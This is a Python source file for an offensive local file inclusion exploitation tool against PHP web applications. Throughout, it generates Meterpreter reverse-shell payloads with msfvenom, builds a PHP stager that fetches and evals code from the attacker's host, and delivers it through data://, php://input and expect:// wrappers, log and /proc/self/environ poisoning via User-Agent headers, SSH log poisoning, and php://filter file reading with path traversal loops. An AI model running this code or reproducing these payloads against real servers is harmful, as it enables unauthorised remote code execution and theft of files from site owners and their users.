__author__ = 'rotlogix'
__author__ = 'unicornFurnace'

from blessings import Terminal
from shell_generator import Generator
from msf import Payload
import sys
import time
import requests
import base64
import textwrap
from urllib.parse import urlparse
import datetime
import subprocess
from urllib.parse import quote_plus
from os import system


# ---------------------------------------------------------------------------------------------------

def progressbar():
    bar_width = 70
    sys.stdout.write(t.cyan("[{0}]  ".format(datetime.datetime.now())) + " " * bar_width)
    sys.stdout.flush()
    sys.stdout.write("\b" * (bar_width + 1))

    for w in range(bar_width):
        time.sleep(0.01)
        sys.stdout.write(".")
        sys.stdout.flush()

    sys.stdout.write("\n")

# ---------------------------------------------------------------------------------------------------

t = Terminal()

""" Things we will need for staged
    attacks and log poisoning """

stager_payload = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
path_traversal_sequences = ['../', '..\\', '/../', './../']


#---------------------------------------------------------------------------------------------------


def msf_payload():
    """ Arguments for Meterpreter """

    while True:
        lhost = input(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Please Enter Host For Callbacks: ").strip()
        if lhost and lhost.replace('.', '').replace(':', '').replace('[', '').replace(']', '').replace('-', '').isalnum():
            break
        print(t.red("[{0}] ".format(datetime.datetime.now())) + "Invalid host format. Please try again.")
    
    while True:
        try:
            lport = int(input(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Please Enter Port For Callbacks: ").strip())
            if 1 <= lport <= 65535:
                break
            else:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Port must be between 1 and 65535. Please try again.")
        except ValueError:
            print(t.red("[{0}] ".format(datetime.datetime.now())) + "Invalid port format. Please enter a number.")

    """  Generate random shell name """

    g = Generator()
    shell = g.generate()

    print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Generating Wrapper")
    progressbar()
    print(t.red("[{0}] ".format(datetime.datetime.now())) + "Success!")
    print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Generating Metasploit Payload")
    progressbar()

    """ MSF payload generation """

    php = "/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f raw > /tmp/{2}.php".format(
        lhost, lport, shell)

    try:
        msf = subprocess.Popen(php, shell=True)
        msf.wait()
        if msf.returncode != 0:
            print(t.red("[{0}] ".format(datetime.datetime.now())) + "Error Generating MSF Payload ")
            sys.exit(1)
        else:
            print(t.red("[{0}] ".format(datetime.datetime.now())) + "Success! ")
            print(t.red("[{0}] ".format(datetime.datetime.now())) + "Payload: /tmp/{0}.php".format(shell))
    except OSError as os_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + str(os_error))

    return lhost, lport, shell


#---------------------------------------------------------------------------------------------------


def format_cookies(cookies):
    c = dict(item.split("=") for item in cookies.split(";"))
    return c


#---------------------------------------------------------------------------------------------------


class Data:
    def __init__(self, target, nostager, cookies):

        self.target = target
        self.nostager = nostager
        self.cookies = cookies

    def execute_data(self):

        lhost, lport, shell = msf_payload()

        """ Build payload """
        """ Handle staging """

        if self.nostager:
            try:
                payload_file = open("/tmp/{0}.php".format(shell), "r")
                payload = payload_file.read()
                payload_file.close()
            except FileNotFoundError:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + f"Payload file not found: /tmp/{shell}.php")
                sys.exit(1)
            except Exception as e:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + f"Error reading payload file: {str(e)}")
                sys.exit(1)
        else:
            payload = stager_payload.format(lhost, shell)

        encoded_payload = quote_plus(base64.b64encode(payload.encode()).decode())

        """ Build data wrapper """

        data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
        lfi = self.target + data_wrapper

        handle = Payload(lhost, lport)
        handle.handler()

        if self.nostager:
            progressbar()
        else:
            print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Starting Web Server ... ")
            progressbar()
            try:
                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
                p.communicate()
            except OSError as os_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Process Error: " + str(os_error))

        input(t.red("[{0}] ".format(
            datetime.datetime.now())) + "Press Enter To Continue When Your Metasploit Handler is Running ...")

        """ LFI payload that downloads the shell with try block for actual
            attack """

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                data_request = requests.get(lfi, cookies=f_cookies)
                if data_request.status_code != 200:
                    print(t.red("[{0}] ".format(datetime.datetime.now())) + "Unexpected HTTP Response ")
                    sys.exit(1)
                else:
                    sys.exit(0)
            except requests.HTTPError as data_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "HTTP Error: " + str(data_error))
                sys.exit(1)
        else:
            try:
                data_request = requests.get(lfi)
                if data_request.status_code != 200:
                    print(t.red("[{0}] ".format(datetime.datetime.now())) + "Unexpected HTTP Response ")
                else:
                    sys.exit(0)
            except requests.HTTPError as data_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "HTTP Error: " + str(data_error))
                sys.exit(1)


#---------------------------------------------------------------------------------------------------


class Input:
    def __init__(self, target, nostager, cookies):

        self.target = target
        self.nostager = nostager
        self.cookies = cookies

    def execute_input(self):

        lhost, lport, shell = msf_payload()

        """ Build payload """

        wrapper = "php://input"
        url = self.target + wrapper

        """ Handle staging """

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell), "r")
            payload = payload_file.read()
            payload_file.close()
        else:
            payload = stager_payload.format(lhost, shell)

        handle = Payload(lhost, lport)
        handle.handler()

        if self.nostager:
            progressbar()
        else:
            print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Starting Web Server ... ")
            progressbar()
            try:
                subprocess.Popen(['python http_server.py'], shell=True)
            except OSError as os_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Process Error: " + str(os_error))

        input(t.cyan("[{0}] ".format(
            datetime.datetime.now())) + "Press Enter To Continue When Your Metasploit Handler Is Running ...")

        """ Handle cookies """

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                input_request = requests.post(url, data=payload, cookies=f_cookies)
                if input_request.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                    sys.exit(1)
                else:
                    sys.exit(0)
            except requests.HTTPError as input_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(input_error))
                sys.exit(1)
        else:
            try:
                input_request = requests.post(url, data=payload)
                if input_request.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                    sys.exit(1)
                else:
                    sys.exit(0)
            except requests.HTTPError as input_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(input_error))
                sys.exit(1)


#---------------------------------------------------------------------------------------------------


class Expect:
    def __init__(self, target, nostager, cookies):

        self.target = target
        self.nostager = nostager
        self.cookies = cookies

    def execute_expect(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport)
        handle.handler()

        """ Build payload """
        """ Handle staging """

        if self.nostager:
            print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "No-Staged Selected!")
            payload_file = open("/tmp/{0}.php".format(shell), "r")
            payload = "expect://echo \""
            payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
            payload += "\" | php"
            payload_file.close()
        else:
            payload = "expect://echo \"" + stager_payload.format(lhost, shell) + "\" | php"
            print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Starting Web Server ... ")
            progressbar()
            try:
                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
                p.communicate()
            except OSError as os_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Process Error: " + str(os_error))

        lfi = self.target + payload

        input(t.cyan("[{0}] ".format(
            datetime.datetime.now())) + "Press Enter To Continue When Your Metasploit Handler is Running ...")

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                r = requests.get(lfi, cookies=f_cookies)
                if r.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                    sys.exit(1)
                else:
                    sys.exit(0)
            except requests.HTTPError as expect_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(expect_error))
                sys.exit(1)
        else:
            try:
                r = requests.get(lfi)
                if r.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                    sys.exit(1)
                else:
                    sys.exit(0)
            except requests.HTTPError as expect_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(expect_error))
                sys.exit(1)


#---------------------------------------------------------------------------------------------------


class Logs:
    def __init__(self, target, location, nostager, relative, cookies):

        self.target = target
        self.location = location
        self.nostager = nostager
        self.relative = relative
        self.cookies = cookies

    def execute_logs(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport)
        handle.handler()

        """ Handle staging """

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell), "r")
            payload = "<?php eval(base64_decode('{0}')); ?>".format(
                base64.b64encode(payload_file.read().encode()).decode().replace("\n", " "))
            payload_file.close()
        else:
            payload = stager_payload.format(lhost, shell)
            progressbar()
            try:
                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
                p.communicate()
            except OSError as os_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Process Error: " + str(os_error))

        lfi = self.target + self.location

        input(t.cyan("[{0}] ".format(
            datetime.datetime.now())) + "Press Enter To Continue When Your Metasploit Handler is Running ...")

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                headers = {'User-Agent': payload}
                r = requests.get(lfi, headers=headers, cookies=f_cookies)
                if r.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                else:
                    if not self.relative:
                        r = requests.get(lfi)
                        print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
                                      .format(datetime.datetime.now())))
                        if r.status_code != 200:
                            print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                    else:
                        for path_traversal_sequence in path_traversal_sequences:
                            for counter in range(10):
                                lfi = self.target + path_traversal_sequence * counter + self.location
                                r = requests.get(lfi)
                                print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
                                              .format(datetime.datetime.now())))
                                if r.status_code != 200:
                                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
            except requests.HTTPError as access_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
        else:
            try:
                headers = {'User-Agent': payload}
                r = requests.get(lfi, headers=headers)
                if r.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                else:
                    if not self.relative:
                        r = requests.get(lfi)
                        print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
                                      .format(datetime.datetime.now())))
                        if r.status_code != 200:
                            print(t.white("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                    else:
                        for path_traversal_sequence in path_traversal_sequences:
                            for counter in range(10):
                                lfi = self.target + path_traversal_sequence * counter + self.location
                                r = requests.get(lfi)
                                print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
                                              .format(datetime.datetime.now())))
                                if r.status_code != 200:
                                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
            except requests.HTTPError as access_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))


#---------------------------------------------------------------------------------------------------


class Environ:
    def __init__(self, target, nostager, relative, cookies):

        self.target = target
        self.nostager = nostager
        self.relative = relative
        self.location = "/proc/self/environ"
        self.cookies = cookies

    def execute_environ(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport)
        handle.handler()

        """ Handle staging """

        if self.nostager:
            print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "No-Staged Selected!")
            payload_file = open("/tmp/{0}.php".format(shell), "r")
            payload = "<?php eval(base64_decode('{0}')); ?>".format(
                base64.b64encode(payload_file.read().encode()).decode().replace("\n", ""))
            payload_file.close()
        else:
            payload = stager_payload.format(lhost, shell)
            progressbar()
            try:
                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
                p.communicate()
            except OSError as os_error:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Process Error: " + str(os_error))

        """ Build LFI """

        lfi = self.target + self.location
        headers = {'User-Agent': payload}

        input(t.cyan(
            "[{0}] ".format(datetime.datetime.now())) + "Press Enter To Continue When Your Metasploit Handler is Running ...")
        try:
            if not self.relative:
                if self.cookies:
                    f_cookies = format_cookies(self.cookies)
                    try:
                        r = requests.get(lfi, headers=headers, cookies=f_cookies)
                        if r.status_code != 200:
                            print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                            sys.exit(1)
                        else:
                            sys.exit(0)
                    except requests.RequestException as access_error:
                        print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
                        sys.exit(1)
                else:
                    try:
                        r = requests.get(lfi, headers=headers)
                        if r.status_code != 200:
                            print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                            sys.exit(1)
                        else:
                            sys.exit(0)
                    except requests.RequestException as access_error:
                        print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
                        sys.exit(1)
            else:
                for path_traversal_sequence in path_traversal_sequences:
                    for counter in range(10):
                        lfi = self.target + path_traversal_sequence * counter + self.location
                        if self.cookies:
                            f_cookies = format_cookies(self.cookies)
                            try:
                                r = requests.get(lfi, headers=headers, cookies=f_cookies)
                                if r.status_code != 200:
                                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                                    sys.exit(1)
                                else:
                                    sys.exit(0)
                            except requests.RequestException as access_error:
                                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
                                sys.exit(1)
                        else:
                            try:
                                r = requests.get(lfi, headers=headers)
                                if r.status_code != 200:
                                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                                    sys.exit(1)
                                else:
                                    sys.exit(0)
                            except requests.RequestException as access_error:
                                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
                                sys.exit(1)
        except Exception as unknown_error:
            print(t.red("[{0}] Unknown Error ".format(datetime.datetime.now())) + str(unknown_error))
            sys.exit(1)


#---------------------------------------------------------------------------------------------------


class SSHLogs:
    def __init__(self, target, location, relative, cookies):

        self.target = target
        self.location = location
        self.relative = relative
        self.cookies = cookies

    def execute_ssh(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport)
        handle.handler()

        payload_file = open('/tmp/{0}.php'.format(shell), 'r')

        payload_stage2 = quote_plus(payload_file.read())
        payload_file.close()
        payload = "<?php eval(\\$_GET['code'])?>"

        print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Start SSH Log Poisoning ..." + "\n")

        host = urlparse.urlsplit(self.target).netloc
        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))

        print("\n")

        print(t.red("[{0}] ".format(datetime.datetime.now())) + "Executing Shell!")

        """ Attempt traverse """

        if not self.relative:
            lfi = self.target + self.location + '&code={0}'.format(payload_stage2)
            if self.cookies:
                f_cookies = format_cookies(self.cookies)
                try:
                    r = requests.get(lfi, cookies=f_cookies)
                    if r.status_code != 200:
                        print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                except requests.HTTPError as access_error:
                    print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
            else:
                try:
                    r = requests.get(lfi)
                    if r.status_code != 200:
                        print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                except requests.HTTPError as access_error:
                    print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))

        else:
            for path_traversal_sequence in path_traversal_sequences:
                for counter in range(10):
                    lfi = self.target + path_traversal_sequence * counter + self.location + '&code={0}'.format(
                        payload_stage2)
                    if self.cookies:
                        f_cookies = format_cookies(self.cookies)
                        try:
                            r = requests.get(lfi, cookies=f_cookies)
                            if r.status_code != 200:
                                print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                                sys.exit(1)
                            else:
                                sys.exit(0)
                        except requests.HTTPError as access_error:
                            print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
                            sys.exit(1)
                    else:
                        try:
                            r = requests.get(lfi)
                            if r.status_code != 200:
                                print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                                sys.exit(1)
                            else:
                                sys.exit(0)
                        except requests.HTTPError as access_error:
                            print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now())) + str(access_error))
                            sys.exit(1)


#---------------------------------------------------------------------------------------------------


class Filter:
    def __init__(self, target, cookies):

        self.target = target
        self.cookies = cookies

    def execute_filter(self):

        """ Build payload """

        f_file = input(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Please Enter File To Read: ")
        payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)
        lfi = self.target + payload

        """ Handle cookies """

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                r = requests.get(lfi, cookies=f_cookies)
                if r.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                else:
                    time.sleep(1)
                    try:
                        result = base64.b64decode(r.text)
                        print(
                            t.cyan("[{0}] ".format(datetime.datetime.now())) + "Decoded: " + t.cyan(
                                textwrap.fill(result)))
                    except TypeError as type_error:
                        print(type_error)
                        sys.exit(1)
            except requests.HTTPError as filter_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now()) + str(filter_error)))
        else:
            try:
                r = requests.get(lfi)
                if r.status_code != 200:
                    print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                    sys.exit(1)
                else:
                    time.sleep(1)
                    try:
                        result = base64.b64decode(r.text)
                        print(
                            t.cyan("[{0}] ".format(datetime.datetime.now())) + "Decoded: " + t.cyan(
                                textwrap.fill(result)))
                    except TypeError as type_error:
                        print(type_error)
                        sys.exit(1)
            except requests.HTTPError as filter_error:
                print(t.red("[{0}] HTTP Error ".format(datetime.datetime.now()) + str(filter_error)))
